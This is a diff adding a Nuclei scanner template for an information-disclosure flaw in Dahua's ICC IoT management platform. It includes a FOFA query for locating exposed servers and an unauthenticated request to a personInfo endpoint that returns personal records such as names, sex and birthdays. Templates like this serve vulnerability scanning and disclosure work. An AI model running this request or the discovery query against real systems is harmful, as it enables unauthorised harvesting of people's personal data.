@@ -1,0 +1,26 @@
+id: dahua-icc-personInfo-disclosure
+
+info:
+  name: 大华 icc 智能物联综合管理平台 page - 信息泄露
+  author: leadlife
+  severity: medium
+  description:
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: body="/static/fontshd/font-hd.css" || icon_hash="-1935899595" || body="*客户端会小于800*" 
+  tags: dahua,disclosure,icc
+
+http:
+  - raw:
+      - |
+        GET /evo-apigw/evo-face/personInfo/page?pageSize=10 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+        Accept-Encoding: gzip
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains_all(body,"name","sex","sexStr","birthday")'
